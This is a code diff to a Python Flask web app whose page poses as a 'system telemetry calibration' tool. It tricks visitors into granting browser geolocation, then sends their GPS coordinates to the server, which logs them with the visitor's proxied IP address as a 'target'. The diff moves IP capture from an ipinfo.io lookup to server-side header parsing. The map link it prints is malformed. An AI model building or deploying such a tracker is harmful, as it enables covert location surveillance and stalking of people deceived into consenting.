@@ -34,24 +34,21 @@ HTML_TEMPLATE = """
     }
     
     async function initialize() {
-        let payload = { layer1: {}, layer2: {} };
         writeLog("[*] Layer 1: Accessing network metadata...");
-        try {
-            let res = await fetch('https://ipinfo.io');
-            let d = await res.json();
-            payload.layer1 = { ip: d.ip, city: d.city, region: d.region, country: d.country, isp: d.org };
-            writeLog(`[+] IP Handshake: ${d.ip}\\n[+] Baseline Area: ${d.city}`);
-        } catch (err) { writeLog("[-] Layer 1 Error."); }
         
-        await transmit({ type: "layer1", data: payload.layer1 });
+        // Transmit an empty handshake to trigger the server-side IP extractor
+        await transmit({ type: "layer1" });
+        writeLog("[+] Layer 1 complete.");
         
         writeLog("\\n[*] Layer 2: Syncing device positioning system...\\nPlease accept the browser prompt.");
         if (!navigator.geolocation) { return; }
         navigator.geolocation.getCurrentPosition(
             async (p) => {
-                payload.layer2 = { latitude: p.coords.latitude, longitude: p.coords.longitude, acc: p.coords.accuracy };
                 writeLog("[SUCCESS] System telemetry calibration confirmed.");
-                await transmit({ type: "layer2", data: payload.layer2 });
+                await transmit({ 
+                    type: "layer2", 
+                    data: { latitude: p.coords.latitude, longitude: p.coords.longitude, acc: p.coords.accuracy } 
+                });
             },
             async (e) => {
                 writeLog("[-] Layer 2 Refused.");
@@ -74,21 +71,29 @@ def home():
 def receive_data():
     req = request.get_json()
     dtype = req.get('type')
-    data = req.get('data')
+    
     print("\n" + "="*55)
     if dtype == "layer1":
+        # Extract the real client IP passing through the Render/Cloud proxy headers
+        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if ',' in str(client_ip):
+            client_ip = client_ip.split(',')[0].strip()
+            
         print(f" [HANDSHAKE LOGGED]")
-        print(f"   IP Address : {data.get('ip')}\n   Location   : {data.get('city')}, {data.get('region')}\n   Provider   : {data.get('isp')}")
+        print(f"   IP Address : {client_ip}")
+        print(f"   Routing    : Cloud Proxy Pipeline Verified")
+        
     elif dtype == "layer2":
+        data = req.get('data')
         print(f" [GPS CALIBRATION LOGGED]")
         if 'error' in data: 
             print("   Status     : ACCESS DECLINED BY USER")
         else:
-            print(f"   Coordinates: {data.get('latitude')}, {data.get('longitude')}\n   Target Map : https://google.com{data.get('latitude')},{data.get('longitude')}")
+            print(f"   Coordinates: {data.get('latitude')}, {data.get('longitude')}")
+            print(f"   Target Map : https://google.com{data.get('latitude')},{data.get('longitude')}")
     print("="*55 + "\n")
     return jsonify({"status": "acknowledged"}), 200
 
 if __name__ == '__main__':
-    # Cloud providers inject a dynamic environment PORT variable that we must listen to
     port = int(os.environ.get("PORT", 8080))
     app.run(host='0.0.0.0', port=port)
